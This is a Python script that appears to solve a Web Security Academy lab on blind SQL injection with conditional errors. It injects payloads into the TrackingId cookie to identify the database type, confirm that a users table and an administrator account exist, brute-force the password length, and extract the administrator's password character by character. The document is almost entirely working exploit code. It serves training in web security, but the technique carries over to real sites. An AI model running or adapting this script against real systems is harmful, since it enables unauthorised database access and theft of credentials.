
# Blind SQL injection with conditional errors
# Vulnerability in TrackingId cookie

import requests
import urllib3
import urllib
import string
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = 'https://0a4c005d04ea4854c08a9de600820024.web-security-academy.net/'

# Getting Cookies
r = requests.get(url, verify=False)
cookies = r.cookies.get_dict()


# Determining Database (Oracle / Non-oracle)
payload = "' || (SELECT '') -- -"       # This will error out if db is oracle because we need FROM clause in oracle
payload = urllib.parse.quote(payload)

mal_cookies = cookies.copy()
mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

r = requests.get(url, cookies=mal_cookies, verify=False)

if r.status_code == 500:
    print('[+] DB is Oracle')
else:
    print('[+] DB is Non-Oracle')


# Determining if Users table exists
payload = "' || (SELECT '' FROM users WHERE rownum=1)-- -"
payload = urllib.parse.quote(payload)

mal_cookies = cookies.copy()
mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

r = requests.get(url, cookies=mal_cookies, verify=False)

if r.status_code != 500:
    print('[+] Users Table Exists in DB')
else:
    print('[-] Users Table Doesn\'t Exists in DB')


# Determining if administrator user exists in users table
# Order of execution of SQL
# FROM  WHERE  SELECT
# If administrator user exists in users table then the select clause will run which will error out

payload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')-- -"
payload = urllib.parse.quote(payload)

mal_cookies = cookies.copy()
mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

r = requests.get(url, cookies=mal_cookies, verify=False)

if r.status_code == 500:
    print('[+] administrator user exists in users table')
else:
    print('[-] administrator user doesn\'t exists in users table')


# Determining the password length of administrator user
print('[+] Finding password length for administrator user...')
pass_len = 0
for i in range(1, 100):
    payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)={i})--"
    payload = urllib.parse.quote(payload)

    mal_cookies = cookies.copy()
    mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

    r = requests.get(url, cookies=mal_cookies, verify=False)

    sys.stdout.write(f'\r{i}')
    sys.stdout.flush()
    if r.status_code == 500:
        pass_len = i
        break


# Finding administrator user password
print('\n[+] Finding password for administrator user')
password = ''
chars = string.digits + string.ascii_letters

for i in range(1, pass_len+1):
    for c in chars:
        payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,{i},1)='{c}')--"
        payload = urllib.parse.quote(payload)

        mal_cookies = cookies.copy()
        mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

        r = requests.get(url, cookies=mal_cookies, verify=False)

        sys.stdout.write(f'\r{password}{c}')
        sys.stdout.flush()
        if r.status_code == 500:
            password += c
            break